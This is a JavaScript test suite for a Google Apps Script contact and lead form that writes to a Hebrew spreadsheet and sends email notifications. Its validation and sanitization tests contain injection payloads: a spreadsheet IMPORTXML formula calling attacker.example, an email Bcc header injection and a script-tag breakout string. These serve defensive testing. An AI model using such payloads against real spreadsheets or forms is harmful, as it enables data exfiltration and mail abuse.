const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const crypto = require('node:crypto');
const path = require('node:path');
const script = fs.readFileSync(path.join(__dirname, '../integrations/google-apps-script/Code.gs'), 'utf8');
const HEADERS = ['תאריך ושעת הפנייה', 'שם מלא', 'טלפון', 'אימייל', 'שירות מבוקש', 'הודעה', 'מקור הפנייה', 'סטטוס טיפול', '_request_id', '_payload_hash', '_notification_status', '_notification_updated_at'];
const uuid = number => `00000000-0000-4000-8000-${String(number).padStart(12, '0')}`;
const input = (changes = {}) => ({ requestId: uuid(1), fullName: 'בדיקת מערכת', phone: '054-846-8822', email: 'test@example.invalid', service: 'ניהול נכס', message: 'בדיקה בלבד', source: 'contact', consent: true, website: '', startedAt: Date.now() - 3000, ...changes });

function sandbox(options = {}) {
  const state = { grid: options.empty ? [] : [HEADERS.slice()], sent: [], warnings: [], formats: [], rate: new Map(), lockCalls: 0, releases: 0, flushes: 0, leadWrites: 0, maxRows: options.maxRows || 1000, maxColumns: 12, zone: null, frozen: 0, hidden: null, filter: null, configuredProperties: { SPREADSHEET_ID: 'private-test-spreadsheet', NOTIFICATION_EMAIL: 'notify@example.invalid', SHEET_NAME: 'פניות', ...options.properties } };
  const ensureCell = (row, column) => { while (state.grid.length < row) state.grid.push([]); while (state.grid[row - 1].length < column) state.grid[row - 1].push(''); };
  function range(row, column, rows = 1, columns = 1) {
    return {
      getValues() {
        const result = Array.from({ length: rows }, (_, r) => Array.from({ length: columns }, (_, c) => state.grid[row + r - 1]?.[column + c - 1] ?? ''));
        if (options.badReadback && row > 1 && column === 9 && columns === 2) result[0][0] = 'wrong';
        return result;
      },
      getValue() { return this.getValues()[0][0]; },
      setValues(values) {
        assert.equal(values.length, rows); assert.ok(values.every(value => value.length === columns));
        if (row > 1 && column === 1) {
          if (options.failWrite) throw new Error('Injected spreadsheet error containing private details');
          state.leadWrites += 1;
        }
        values.forEach((valuesRow, r) => valuesRow.forEach((value, c) => { ensureCell(row + r, column + c); state.grid[row + r - 1][column + c - 1] = value; }));
        return this;
      },
      setNumberFormat(format) { state.formats.push({ row, column, rows, columns, format }); return this; },
      setFontWeight() { return this; }, setBackground() { return this; }, setFontColor() { return this; }, setWrap() { return this; }, setDataValidation() { return this; },
      getRow() { return row; }, getColumn() { return column; }, getNumColumns() { return columns; }, getNumRows() { return rows; },
      createTextFinder(text) {
        return { matchEntireCell() { return this; }, findNext() { for (let r = row; r < row + rows; r += 1) if (state.grid[r - 1]?.[column - 1] === text) return { getRow: () => r }; return null; } };
      },
      createFilter() {
        state.filter = { getRange: () => range(row, column, rows, columns), getColumnFilterCriteria: () => null, setColumnFilterCriteria() {}, remove() { state.filter = null; } };
        return state.filter;
      },
    };
  }
  const sheet = {
    getRange: range, getName: () => 'פניות', getLastRow: () => state.grid.length,
    getMaxRows: () => state.maxRows, getMaxColumns: () => state.maxColumns,
    insertRowsAfter(_, count) { state.maxRows += count; }, insertColumnsAfter(_, count) { state.maxColumns += count; },
    setRightToLeft(value) { state.rtl = value; }, setFrozenRows(value) { state.frozen = value; }, setRowHeight() {}, setColumnWidth() {},
    hideColumns(start, count) { state.hidden = [start, count]; }, getFilter: () => state.filter,
  };
  const book = { getSheetByName: name => options.missingSheet || name !== 'פניות' ? null : sheet, insertSheet: () => sheet,
    setSpreadsheetTimeZone(value) { state.zone = value; }, getUrl: () => 'https://docs.google.com/spreadsheets/d/private-test-spreadsheet/edit' };
  const lock = { tryLock() { state.lockCalls += 1; return !options.busy; }, releaseLock() { state.releases += 1; } };
  const validation = { requireValueInList() { return this; }, setAllowInvalid() { return this; }, build() { return {}; } };
  const template = { evaluate() { return { setTitle() { return this; }, addMetaTag() { return this; }, setXFrameOptionsMode() { return this; } }; } };
  const context = vm.createContext({
    console: { warn(message) { state.warnings.push(message); } }, Date,
    PropertiesService: { getScriptProperties: () => ({ getProperty: name => state.configuredProperties[name] || null }) },
    LockService: { getScriptLock: () => lock },
    SpreadsheetApp: { openById: () => book, newDataValidation: () => validation, flush() { state.flushes += 1; if (options.failFlushOnce && state.flushes === 1) throw new Error('Injected flush ambiguity'); } },
    CacheService: { getScriptCache: () => ({ get: key => state.rate.get(key) || null, put(key, value, seconds) { assert.equal(seconds, 900); state.rate.set(key, value); } }) },
    Utilities: { DigestAlgorithm: { SHA_256: 'sha256' }, Charset: { UTF_8: 'utf8' }, computeDigest: (algorithm, content) => [...crypto.createHash(algorithm).update(content).digest()],
      formatDate(date, zone, pattern) { state.mailZone = zone; assert.equal(pattern, 'dd/MM/yyyy HH:mm'); return new Intl.DateTimeFormat('en-GB', { timeZone: zone, dateStyle: 'short', timeStyle: 'short' }).format(date); } },
    MailApp: { getRemainingDailyQuota: () => options.quota === undefined ? 100 : options.quota, sendEmail(message) { if (options.failMail) throw new Error('Injected MailApp error'); state.sent.push(message); } },
    HtmlService: { createTemplateFromFile(name) { assert.equal(name, 'Form'); return template; }, XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' } },
  });
  vm.runInContext(script, context, { filename: 'Code.gs' });
  return { state, context, template, sheet };
}

test('valid lead is committed, read back, and notified with Israel time and the configured recipient', () => {
  const { state, context } = sandbox();
  const result = context.submitLead(input());
  assert.equal(result.ok, true); assert.equal(result.saved, true); assert.equal(result.requestId, uuid(1)); assert.equal(result.duplicate, false);
  assert.equal(state.grid.length, 2); const row = state.grid[1];
  assert.ok(row[0] instanceof Date); assert.equal(row[1], 'בדיקת מערכת'); assert.equal(row[2], '0548468822');
  assert.equal(row[6], 'טופס יצירת קשר'); assert.equal(row[7], 'חדש'); assert.equal(row[8], uuid(1)); assert.match(row[9], /^[0-9a-f]{64}$/); assert.equal(row[10], 'sent');
  assert.equal(state.mailZone, 'Asia/Jerusalem'); assert.equal(state.sent[0].to, 'notify@example.invalid'); assert.equal(state.sent[0].replyTo, 'test@example.invalid'); assert.match(state.sent[0].body, /0548468822/);
  assert.ok(state.flushes >= 2); assert.equal(state.lockCalls, state.releases);
  assert.equal(JSON.stringify(result).includes('בדיקת מערכת'), false);
});

test('email and message are optional; booklet source is recorded without gating any download', () => {
  const { state, context } = sandbox(); const payload = input({ email: '', message: '', source: 'booklet' });
  assert.equal(context.submitLead(payload).saved, true); assert.equal(state.grid[1][3], ''); assert.equal(state.grid[1][5], ''); assert.equal(state.grid[1][6], 'הורדת חוברת'); assert.equal('replyTo' in state.sent[0], false);
});

test('retries reuse the persistent request ID and do not add a row or send a second email', () => {
  const { state, context } = sandbox(); const payload = input();
  assert.equal(context.submitLead(payload).saved, true);
  const result = context.submitLead({ ...payload, startedAt: Date.now() - 4000 });
  assert.equal(result.saved, true); assert.equal(result.duplicate, true); assert.equal(state.grid.length, 2); assert.equal(state.sent.length, 1); assert.equal(state.leadWrites, 1);
});

test('same ID with changed content is rejected instead of falsely acknowledging it', () => {
  const { state, context } = sandbox(); const payload = input(); context.submitLead(payload);
  const result = context.submitLead({ ...payload, message: 'שינוי תוכן' });
  assert.equal(result.code, 'CONFLICT'); assert.equal(result.ok, false); assert.equal(state.grid.length, 2); assert.equal(state.sent.length, 1);
});

test('required fields, email, consent, enums, request IDs, types and length bounds are enforced on the server', () => {
  const invalid = [null, [], input({ fullName: '' }), input({ phone: '123' }), input({ phone: { value: '0548468822' } }),
    input({ email: 'invalid' }), input({ email: 'a,b@example.com' }), input({ email: 'a@exa,mple.com' }), input({ email: 'a@example..com' }), input({ email: 'a..b@example.com' }), input({ email: 'x@example.invalid\r\nBcc: someone@example.invalid' }), input({ service: 'שירות לא מוכר' }), input({ consent: false }), input({ consent: 'true' }),
    input({ fullName: 'א'.repeat(81) }), input({ phone: '0'.repeat(31) }), input({ email: 'a'.repeat(255) }), input({ message: 'א'.repeat(2001) }), input({ source: 'attacker' }), input({ requestId: 'invalid' })];
  for (const value of invalid) { const { state, context } = sandbox(); const result = context.submitLead(value); assert.equal(result.ok, false); assert.equal(result.code, 'VALIDATION'); assert.equal(state.grid.length, 1); assert.equal(state.sent.length, 0); }
});

test('honeypot, implausibly quick submissions and invalid timestamps do not save leads', () => {
  for (const changes of [{ website: 'https://spam.example' }, { startedAt: Date.now() }, { startedAt: Date.now() + 5000 }, { startedAt: 0 }, { startedAt: Infinity }, { startedAt: String(Date.now() - 2000) }]) {
    const { state, context } = sandbox(); assert.equal(context.submitLead(input(changes)).ok, false); assert.equal(state.grid.length, 1); assert.equal(state.sent.length, 0);
  }
});

test('server-rendered time avoids dependence on the device clock and old open forms remain valid', () => {
  const { state, context, template } = sandbox(); context.doGet({ parameter: { mode: 'contact' } });
  const config = JSON.parse(template.publicConfigJson);
  assert.equal(typeof config.renderedAt, 'number'); assert.ok(Math.abs(config.renderedAt - Date.now()) < 1000);
  const oldForm = input({ startedAt: config.renderedAt - 7 * 86400000 });
  assert.equal(context.submitLead(oldForm).saved, true); assert.equal(state.grid.length, 2);
});

test('formula injection is escaped after control-character cleanup, and phone remains a text identifier', () => {
  for (const prefix of ['=', '+', '-', '@']) {
    const { state, context } = sandbox(); const message = `\u200f\t${prefix}IMPORTXML("https://attacker.example","//x")`;
    assert.equal(context.submitLead(input({ message, phone: '+972 (54) 846-8822', email: '+tag@example.invalid' })).saved, true);
    assert.equal(state.grid[1][2], "'+972548468822"); assert.equal(state.grid[1][3], "'+tag@example.invalid"); assert.ok(state.grid[1][5].startsWith("'" + prefix));
  }
  const { state, context } = sandbox(); assert.equal(context.submitLead(input({ fullName: 'בדיקת\u202e מערכת', message: 'שורה א\r\nשורה ב\u0000' })).saved, true);
  assert.equal(state.grid[1][1], 'בדיקת מערכת'); assert.equal(state.grid[1][5], 'שורה א\nשורה ב');
});

test('MailApp failure and exhausted quota preserve the confirmed lead and successful acknowledgement', () => {
  for (const options of [{ failMail: true }, { quota: 0 }]) {
    const { state, context } = sandbox(options); const result = context.submitLead(input());
    assert.equal(result.ok, true); assert.equal(result.saved, true); assert.equal(state.grid.length, 2); assert.equal(state.grid[1][10], 'failed'); assert.equal(state.sent.length, 0);
    assert.equal(state.warnings.some(line => /בדיקת מערכת|054|example/.test(line)), false);
  }
});

test('spreadsheet write errors and failed readback cannot produce a success acknowledgement or an email', () => {
  for (const options of [{ failWrite: true }, { badReadback: true }]) {
    const { state, context } = sandbox(options); const result = context.submitLead(input()); assert.equal(result.ok, false); assert.equal(result.code, 'UNAVAILABLE'); assert.equal(state.sent.length, 0); assert.equal(state.lockCalls, state.releases);
  }
});

test('an ambiguous flush is recovered from the durable ID without inserting a second row', () => {
  const { state, context } = sandbox({ failFlushOnce: true }); const payload = input();
  assert.equal(context.submitLead(payload).ok, false); assert.equal(state.grid.length, 2);
  const retry = context.submitLead(payload); assert.equal(retry.saved, true); assert.equal(retry.duplicate, true); assert.equal(state.grid.length, 2); assert.equal(state.sent.length, 0); assert.equal(state.grid[1][10], 'pending');
  state.grid[1][11] = new Date(Date.now() - 601000);
  const recovered = context.retryNotifications_(); assert.equal(recovered.sent, 1); assert.equal(state.sent.length, 1); assert.equal(state.grid[1][10], 'sent');
});

test('rate limiting is best effort by phone and does not block idempotent replay', () => {
  const { state, context } = sandbox();
  for (let i = 1; i <= 3; i += 1) assert.equal(context.submitLead(input({ requestId: uuid(i) })).saved, true);
  assert.equal(context.submitLead(input({ requestId: uuid(4) })).code, 'RATE_LIMIT');
  assert.equal(context.submitLead(input()).duplicate, true); assert.equal(state.grid.length, 4); assert.equal(state.sent.length, 3);
  assert.ok([...state.rate.keys()].every(key => !key.includes('0548468822')));
});

test('lock contention, missing configuration and mismatched headers fail closed', () => {
  for (const options of [{ busy: true }, { properties: { SPREADSHEET_ID: '' } }, { properties: { NOTIFICATION_EMAIL: 'invalid' } }, { missingSheet: true }]) {
    const { state, context } = sandbox(options); assert.equal(context.submitLead(input()).ok, false); assert.equal(state.grid.length, 1); assert.equal(state.sent.length, 0);
  }
  const { state, context } = sandbox(); state.grid[0][0] = 'נתונים אחרים'; assert.equal(context.submitLead(input()).ok, false); assert.equal(state.grid[0][0], 'נתונים אחרים'); assert.equal(state.grid.length, 1);
});

test('setup creates the exact headers, Israel timezone, frozen header, date formatting and a 12-column filter', () => {
  const { state, context } = sandbox({ empty: true }); const result = context.setupLeads_();
  assert.equal(result.ok, true); assert.deepEqual(state.grid[0], HEADERS); assert.equal(state.zone, 'Asia/Jerusalem'); assert.equal(state.frozen, 1); assert.equal(state.rtl, true); assert.deepEqual(state.hidden, [9, 4]);
  assert.equal(state.filter.getRange().getNumColumns(), 12); assert.ok(state.formats.some(format => format.column === 1 && format.format === 'dd/MM/yyyy HH:mm'));
  assert.equal(context.submitLead(input()).saved, true);
});

test('setup preserves existing lead rows and refuses unrelated existing headers', () => {
  const { state, context } = sandbox(); context.submitLead(input()); const first = state.grid[1].slice(); context.setupLeads_(); assert.deepEqual(state.grid[1], first);
  state.grid[0][1] = 'טבלה אחרת'; assert.throws(() => context.setupLeads_(), /Unexpected spreadsheet headers/); assert.equal(state.grid[0][1], 'טבלה אחרת'); assert.deepEqual(state.grid[1], first);
});

test('doGet exposes only public template configuration, sanitizes script text and allowlists source', () => {
  for (const source of ['booklet', 'contact', 'not-a-source']) {
    const { context, template } = sandbox(); context.doGet({ parameter: { mode: 'contact', source } });
    const config = JSON.parse(template.publicConfigJson); assert.equal(config.source, source === 'booklet' ? 'booklet' : 'contact');
    assert.equal(config.siteOrigin, 'https://huxhkuh.github.io'); assert.ok(config.fontUrl.endsWith('/assets/fonts/body.woff2')); assert.equal(config.minFillMs, 1200);
    assert.equal(template.publicConfigJson.includes('private-test-spreadsheet'), false); assert.equal(template.publicConfigJson.includes('notify@example.invalid'), false);
  }
  const { context } = sandbox(); assert.equal(context.safeJson_({ value: '</script><script>\u2028' }).includes('</script>'), false);
});
